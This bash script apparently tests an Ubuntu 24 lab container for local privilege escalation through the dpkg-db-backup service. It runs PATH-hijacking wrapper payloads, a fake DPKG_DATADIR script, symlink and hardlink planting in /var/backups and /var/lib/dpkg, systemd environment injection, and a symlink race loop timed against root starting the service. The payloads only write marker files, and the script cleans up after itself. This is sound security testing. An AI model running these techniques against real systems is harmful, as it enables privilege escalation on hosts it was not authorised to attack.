#!/usr/bin/env bash
set -Eeuo pipefail

container="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$container" bash -s <<'TARGET'
set -Eeuo pipefail

WORK=/tmp/dpkg_db_backup_probe
ROOT_MARKER=/root/dpkg_db_backup_probe_root_marker
ATTACKER=attacker
BACKUP_BASELINE=/tmp/dpkg_db_backup_probe.backups.before
ENV_BASELINE=/tmp/dpkg_db_backup_probe.systemd_env.before

section() {
  printf '\n### %s\n' "$1"
}

attempt_root() {
  printf '+ root# %s\n' "$*"
  set +e
  bash -lc "$*" 2>&1
  rc=$?
  set -e
  printf '[rc=%s]\n' "$rc"
}

attempt_attacker() {
  printf '+ attacker$ %s\n' "$*"
  set +e
  runuser -u "$ATTACKER" -- bash -lc "$*" 2>&1
  rc=$?
  set -e
  printf '[rc=%s]\n' "$rc"
}

backup_names() {
  find /var/backups -maxdepth 1 -type f \( \
    -name 'dpkg.arch*' -o \
    -name 'dpkg.status*' -o \
    -name 'dpkg.diversions*' -o \
    -name 'dpkg.statoverride*' -o \
    -name 'alternatives.tar*' \
  \) -printf '%f\n' | sort
}

cleanup_tmp() {
  rm -rf "$WORK" "$ROOT_MARKER" /tmp/dpkg_db_backup_probe.race.err \
    /tmp/dpkg_db_backup_probe.race.count 2>/dev/null || true
}

cleanup_new_backups() {
  tmp_current=/tmp/dpkg_db_backup_probe.backups.current
  backup_names > "$tmp_current"
  while IFS= read -r name; do
    [ -n "$name" ] || continue
    if ! grep -Fxq "$name" "$BACKUP_BASELINE" 2>/dev/null; then
      rm -f "/var/backups/$name"
      printf 'removed_created_backup=%s\n' "/var/backups/$name"
    fi
  done < "$tmp_current"
  rm -f "$tmp_current"
}

restore_manager_env_if_needed() {
  current_path=$(systemctl show-environment 2>/dev/null | sed -n 's/^PATH=//p' || true)
  before_path=$(sed -n 's/^PATH=//p' "$ENV_BASELINE" 2>/dev/null || true)
  current_datadir=$(systemctl show-environment 2>/dev/null | sed -n 's/^DPKG_DATADIR=//p' || true)
  before_datadir=$(sed -n 's/^DPKG_DATADIR=//p' "$ENV_BASELINE" 2>/dev/null || true)

  case "$current_path" in
    "$WORK/bin:"*)
      if [ -n "$before_path" ]; then
        systemctl set-environment "PATH=$before_path" >/dev/null 2>&1 || true
        echo "restored_systemd_PATH"
      else
        systemctl unset-environment PATH >/dev/null 2>&1 || true
        echo "unset_probe_systemd_PATH"
      fi
      ;;
  esac

  if [ "$current_datadir" = "$WORK/fake-dpkg-datadir" ]; then
    if [ -n "$before_datadir" ]; then
      systemctl set-environment "DPKG_DATADIR=$before_datadir" >/dev/null 2>&1 || true
      echo "restored_systemd_DPKG_DATADIR"
    else
      systemctl unset-environment DPKG_DATADIR >/dev/null 2>&1 || true
      echo "unset_probe_systemd_DPKG_DATADIR"
    fi
  fi
}

final_cleanup() {
  section "cleanup"
  restore_manager_env_if_needed
  cleanup_new_backups
  cleanup_tmp
  rm -f "$BACKUP_BASELINE" "$ENV_BASELINE"
  systemctl reset-failed dpkg-db-backup.service >/dev/null 2>&1 || true
  printf 'probe_tmp_leftovers='
  find /tmp -maxdepth 1 \( -name 'dpkg_db_backup_probe*' -o -name 'dpkg-db-backup-probe*' \) -print | sort | tr '\n' ' '
  printf '\n'
  printf 'system_state_after='
  systemctl is-system-running || true
  printf 'failed_units_after='
  systemctl --failed --no-legend | wc -l
}

cleanup_tmp
backup_names > "$BACKUP_BASELINE"
systemctl show-environment > "$ENV_BASELINE" 2>/dev/null || true

section "target, packages, and default unit state"
cat /etc/os-release
uname -a
printf 'attacker_identity='
id "$ATTACKER"
printf 'container_system_state='
systemctl is-system-running || true
dpkg-query -W dpkg systemd debianutils tar coreutils 2>/dev/null || true
dpkg-query -S /usr/libexec/dpkg/dpkg-db-backup /usr/bin/savelog /usr/bin/tar \
  /usr/lib/systemd/system/dpkg-db-backup.service \
  /usr/lib/systemd/system/dpkg-db-backup.timer 2>/dev/null || true
systemctl list-unit-files dpkg-db-backup.service dpkg-db-backup.timer --no-pager || true
systemctl is-enabled dpkg-db-backup.timer || true
systemctl is-active dpkg-db-backup.timer || true
systemctl status dpkg-db-backup.service dpkg-db-backup.timer --no-pager -l || true
systemctl list-timers --all --no-pager | grep -E 'NEXT|dpkg-db-backup' || true
systemctl show dpkg-db-backup.service -p FragmentPath -p UnitFileState -p ActiveState -p SubState -p Triggers -p ConditionResult || true
systemctl show dpkg-db-backup.timer -p FragmentPath -p UnitFileState -p UnitFilePreset -p ActiveState -p SubState -p NextElapseUSecRealtime -p LastTriggerUSec || true
printf 'systemd_manager_env_before='
grep -E '^(PATH|DPKG_DATADIR)=' "$ENV_BASELINE" || true

section "line-numbered code and unit config"
echo "--- /usr/libexec/dpkg/dpkg-db-backup ---"
nl -ba /usr/libexec/dpkg/dpkg-db-backup
echo "--- /usr/lib/systemd/system/dpkg-db-backup.service ---"
nl -ba /usr/lib/systemd/system/dpkg-db-backup.service
echo "--- /usr/lib/systemd/system/dpkg-db-backup.timer ---"
nl -ba /usr/lib/systemd/system/dpkg-db-backup.timer

section "default permissions on code, backup dir, and dpkg database"
stat -c '%A %a %U:%G %n' /usr/libexec/dpkg/dpkg-db-backup \
  /usr/lib/systemd/system/dpkg-db-backup.service \
  /usr/lib/systemd/system/dpkg-db-backup.timer \
  /var/backups /var/lib/dpkg /var/lib/dpkg/status /var/lib/dpkg/diversions \
  /var/lib/dpkg/statoverride /var/lib/dpkg/alternatives 2>&1 || true
namei -om /usr/libexec/dpkg/dpkg-db-backup /var/backups /var/lib/dpkg/status || true
sysctl fs.protected_symlinks fs.protected_hardlinks 2>/dev/null || true
find /var/backups -maxdepth 1 -xdev -ls | sort
find /var/lib/dpkg -maxdepth 1 -xdev -ls | sort | sed -n '1,80p'
printf 'baseline_backup_files='
cat "$BACKUP_BASELINE" | tr '\n' ' '
printf '\n'

section "attacker-controlled payloads for PATH and DPKG_DATADIR tests"
runuser -u "$ATTACKER" -- bash <<'ATTACKER_SETUP'
set -Eeuo pipefail
WORK=/tmp/dpkg_db_backup_probe
rm -rf "$WORK"
mkdir -p "$WORK/bin" "$WORK/fake-dpkg-datadir/sh" "$WORK/hits"
printf 'attacker target before root\n' > "$WORK/attacker_chosen_target"
printf 'attacker fake status\n' > "$WORK/fake_status"
printf 'attacker hardlink source\n' > "$WORK/hardlink_source"

cat > "$WORK/bin/payload" <<'PAYLOAD'
#!/bin/sh
name=$(basename "$0")
mkdir -p /tmp/dpkg_db_backup_probe/hits 2>/dev/null || true
{
  printf 'helper=%s\n' "$name"
  id
  printf 'argv='
  for arg in "$@"; do printf ' <%s>' "$arg"; done
  printf '\n'
  env | grep -E '^(PATH|DPKG_DATADIR|HOME|USER)=' || true
  printf -- '---\n'
} >> "/tmp/dpkg_db_backup_probe/hits/${name}.$$" 2>/dev/null || true
if [ "$(id -u)" = 0 ]; then
  {
    printf 'ROOT PAYLOAD HIT helper=%s\n' "$name"
    id
    printf 'argv='
    for arg in "$@"; do printf ' <%s>' "$arg"; done
    printf '\n'
  } >> /root/dpkg_db_backup_probe_root_marker 2>/dev/null || true
fi
case "$name" in
  tar) exec /usr/bin/tar "$@" ;;
  savelog) exec /usr/bin/savelog "$@" ;;
  *) exit 0 ;;
esac
PAYLOAD
chmod 755 "$WORK/bin/payload"
ln -sf payload "$WORK/bin/tar"
ln -sf payload "$WORK/bin/savelog"

cat > "$WORK/fake-dpkg-datadir/sh/dpkg-error.sh" <<'FAKE_DPKG_ERROR'
{
  printf 'fake_dpkg_error_sourced\n'
  id
  env | grep -E '^(PATH|DPKG_DATADIR|HOME|USER)=' || true
  printf -- '---\n'
} >> /tmp/dpkg_db_backup_probe/hits/dpkg_datadir_sourced.$$ 2>/dev/null || true
if [ "$(id -u)" = 0 ]; then
  {
    printf 'ROOT DPKG_DATADIR HIT\n'
    id
  } >> /root/dpkg_db_backup_probe_root_marker 2>/dev/null || true
fi
setup_colors() { :; }
error() {
  printf '%s\n' "$*" >&2
  exit 1
}
FAKE_DPKG_ERROR
ATTACKER_SETUP
find "$WORK" -maxdepth 3 -ls | sort

section "attacker write, symlink, hardlink, and direct-execution attempts"
attempt_attacker 'id; groups; umask'
attempt_attacker 'for p in /var/backups /var/lib/dpkg /var/lib/dpkg/status /usr/libexec/dpkg/dpkg-db-backup /usr/lib/systemd/system/dpkg-db-backup.service /usr/lib/systemd/system/dpkg-db-backup.timer; do [ -e "$p" ] || continue; [ -w "$p" ] && echo "WRITABLE $p" || echo "not_writable $p"; done'
attempt_attacker 'touch /var/backups/dpkg.status'
attempt_attacker 'ln -s /tmp/dpkg_db_backup_probe/attacker_chosen_target /var/backups/dpkg.status'
attempt_attacker 'ln /tmp/dpkg_db_backup_probe/hardlink_source /var/backups/dpkg.status.hard'
attempt_attacker 'rm -f /var/backups/dpkg.status.0'
attempt_attacker 'touch /var/lib/dpkg/status.probe'
attempt_attacker 'ln -s /tmp/dpkg_db_backup_probe/fake_status /var/lib/dpkg/status.probe_link'
attempt_attacker 'ln /var/lib/dpkg/status /tmp/dpkg_db_backup_probe/hardlink_to_dpkg_status'
attempt_attacker 'ln /var/lib/dpkg/diversions /tmp/dpkg_db_backup_probe/hardlink_to_dpkg_diversions'
attempt_attacker 'PATH=/tmp/dpkg_db_backup_probe/bin:$PATH DPKG_DATADIR=/tmp/dpkg_db_backup_probe/fake-dpkg-datadir /usr/libexec/dpkg/dpkg-db-backup; rc=$?; echo "direct_attacker_exec_rc=$rc"; exit 0'
attempt_attacker 'timeout 8s systemctl set-environment PATH=/tmp/dpkg_db_backup_probe/bin:$PATH DPKG_DATADIR=/tmp/dpkg_db_backup_probe/fake-dpkg-datadir'
attempt_attacker 'timeout 8s systemctl start dpkg-db-backup.service'
attempt_attacker 'timeout 8s systemctl start dpkg-db-backup.timer'
attempt_attacker 'timeout 8s busctl call org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager StartUnit ss dpkg-db-backup.service replace'
printf 'systemd_manager_env_after_attacker_attempts='
systemctl show-environment 2>/dev/null | grep -E '^(PATH|DPKG_DATADIR)=' || true

section "attacker payload hits before root trigger"
find "$WORK/hits" -type f -maxdepth 1 -print -exec sed -n '1,16p' {} \; | sort || true
if [ -e "$ROOT_MARKER" ]; then
  echo "UNEXPECTED_ROOT_MARKER_BEFORE_ROOT_TRIGGER"
  cat "$ROOT_MARKER"
else
  echo "NO_ROOT_MARKER_BEFORE_ROOT_TRIGGER"
fi

section "attacker race while root validates service execution"
rm -f /tmp/dpkg_db_backup_probe.race.err /tmp/dpkg_db_backup_probe.race.count
runuser -u "$ATTACKER" -- bash -lc '
  set +e
  end=$((SECONDS + 6))
  n=0
  while [ "$SECONDS" -lt "$end" ]; do
    rm -f /var/backups/dpkg.status /var/backups/dpkg.status.0 /var/backups/alternatives.tar /var/lib/dpkg/status 2>>/tmp/dpkg_db_backup_probe.race.err
    ln -sf /tmp/dpkg_db_backup_probe/attacker_chosen_target /var/backups/dpkg.status 2>>/tmp/dpkg_db_backup_probe.race.err
    ln -sf /tmp/dpkg_db_backup_probe/attacker_chosen_target /var/backups/dpkg.status.0 2>>/tmp/dpkg_db_backup_probe.race.err
    ln -sf /tmp/dpkg_db_backup_probe/fake_status /var/lib/dpkg/status 2>>/tmp/dpkg_db_backup_probe.race.err
    : 2>>/tmp/dpkg_db_backup_probe.race.err > /var/backups/dpkg.status
    n=$((n + 1))
  done
  echo "$n" > /tmp/dpkg_db_backup_probe.race.count
' &
race_pid=$!
attempt_root 'systemctl reset-failed dpkg-db-backup.service; systemctl start dpkg-db-backup.service; systemctl status --no-pager -l dpkg-db-backup.service | sed -n "1,80p"'
wait "$race_pid" || true
printf 'race_iterations='
cat /tmp/dpkg_db_backup_probe.race.count 2>/dev/null || true
printf '\n'
printf 'race_error_sample='
sort -u /tmp/dpkg_db_backup_probe.race.err 2>/dev/null | sed -n '1,20p' | tr '\n' ' '
printf '\n'

section "post-root-trigger backup outputs and attacker replacement attempts"
find /var/backups -maxdepth 1 -xdev \( -name 'dpkg.*' -o -name 'alternatives.tar*' \) -ls | sort || true
stat -c '%A %a %U:%G %n' /var/backups/dpkg.status* /var/backups/dpkg.diversions* \
  /var/backups/dpkg.statoverride* /var/backups/alternatives.tar* 2>/dev/null || true
attempt_attacker 'for f in /var/backups/dpkg.status.0 /var/backups/dpkg.diversions.0 /var/backups/dpkg.statoverride.0 /var/backups/alternatives.tar.0; do [ -e "$f" ] || continue; echo "try_mutate $f"; echo attacker_append >> "$f"; rm -f "$f"; ln -sf /tmp/dpkg_db_backup_probe/attacker_chosen_target "$f"; ln "$f" "/tmp/dpkg_db_backup_probe/hardlink_$(basename "$f")"; done'
attempt_attacker 'find /tmp/dpkg_db_backup_probe -maxdepth 1 -name "hardlink_*" -ls | sort'

section "root marker and attacker-chosen write target check"
if [ -e "$ROOT_MARKER" ]; then
  echo "ROOT_MARKER_PRESENT"
  cat "$ROOT_MARKER"
else
  echo "NO_ROOT_MARKER"
fi
if grep -R 'uid=0(root)' "$WORK/hits" >/dev/null 2>&1; then
  echo "ROOT_HIT_FOUND_IN_ATTACKER_HITS"
  grep -R -n 'uid=0(root)' "$WORK/hits" || true
else
  echo "NO_ROOT_HIT_IN_ATTACKER_HITS"
fi
printf 'attacker_chosen_target_stat='
stat -c '%A %a %U:%G %s %n' "$WORK/attacker_chosen_target" 2>&1 || true
printf 'attacker_chosen_target_contents='
cat "$WORK/attacker_chosen_target" 2>/dev/null || true
printf '\n'
find "$WORK/hits" -type f -maxdepth 1 -print -exec sed -n '1,16p' {} \; | sort || true

final_cleanup
TARGET
